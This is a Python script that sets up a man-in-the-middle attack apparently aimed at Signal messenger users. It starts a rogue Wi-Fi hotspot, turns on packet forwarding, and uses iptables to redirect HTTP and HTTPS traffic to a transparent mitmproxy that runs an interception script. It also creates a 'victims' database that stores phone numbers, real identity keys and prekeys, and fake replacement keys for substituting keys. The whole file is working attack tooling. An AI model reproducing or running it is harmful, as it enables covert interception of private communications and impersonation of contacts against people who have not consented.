import subprocess
import os
import sys
import signal
from itertools import product
import sqlite3
from pathlib import Path

DB_NAME = "mitm.db"

def setup_db():
    dbpath = Path.cwd() / DB_NAME
    if not Path.exists(dbpath):
        db = sqlite3.connect(DB_NAME)
        cur = db.cursor()
        cur.execute("CREATE TABLE victims(pNumber, aci, pni, unidentifiedAccessKey, aciIdenKey, pniIdenKey, aciSignedPreKey, pniSignedPreKey, aciPreKeys, \
            pniPreKeys,aciFakeIdenKey, pniFakeIdenKey, aciFakeSignedPreKey, pniFakeSignedPreKey, aciFakePrekeys, pniFakePreKeys, \
                PRIMARY KEY (pNumber, aci, pni));")
        res = cur.execute("SELECT name FROM sqlite_master")
        
        cur.execute("CREATE TABLE end2end(v_aci, recv_aci, deviceId,recv_IdenKey, recv_SignedPreKey, \
            recv_PreKey, recv_FakeIdenKey, recv_FakeSignedPreKey, recv_FakePreKey, PRIMARY KEY (v_aci, recv_aci, deviceId));")
        print(res.fetchone())
    else:
        print("DB already exists.... skipping")

    

def signal_handler(sig, frame):
    print('You pressed Ctrl+C!')
    teardown() # kill this mess
    sys.exit(0)

def try_run_sudo(cmd):
    try_run(f"sudo {cmd}")

def try_run(cmd: str):
    try:
        res = subprocess.run(cmd, shell=True,check=True, stdout=open(os.devnull, 'wb'))
        #print(res.returncode)
    except subprocess.CalledProcessError as e:
        print(f"cmd fucked: {e}\n{cmd}")

def setup(): 
    # Set all the crap needed
    allow_forward = [
        "sysctl -w net.ipv4.ip_forward=1",
        "sysctl -w net.ipv6.conf.all.forwarding=1",
        "sysctl -w net.ipv4.conf.all.send_redirects=0",
    ]

    [ try_run_sudo(cmd) for cmd in allow_forward ]
    
    try_run_sudo("create_ap --freq-band 2.4 --daemon wlp0s20f3 wlx482254431544 DummyHotspot 1234567890")

    [ try_run_sudo(f"{cmd} -t nat -A PREROUTING -i ap0 -p tcp --dport {port} -j REDIRECT --to-port 8080") for (cmd,port) in 
        product(["iptables", "ip6tables"], [80,443])
    ]

    setup_db()
    mitm = 'mitmproxy --mode transparent --showhost --ssl-insecure --ignore-hosts ".*google\w*\.com" -s intercept.py'
    os.system(f"gnome-terminal -- {mitm} &")
    
def teardown():
    # Kill me with a smile, bby
    remove_forward = [
        "sysctl -w net.ipv4.ip_forward=0",
        "sysctl -w net.ipv6.conf.all.forwarding=0",
        "sysctl -w net.ipv4.conf.all.send_redirects=1",
    ]
    
    [try_run_sudo(cmd) for cmd in remove_forward]
    
    try_run_sudo("create_ap --stop wlp0s20f3")
    
    try_run_sudo("iptables -t nat -F")
    try_run_sudo("ip6tables -t nat -F")
    try_run_sudo("pkill mitmproxy")



if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    print("started")
    setup()
    signal.pause()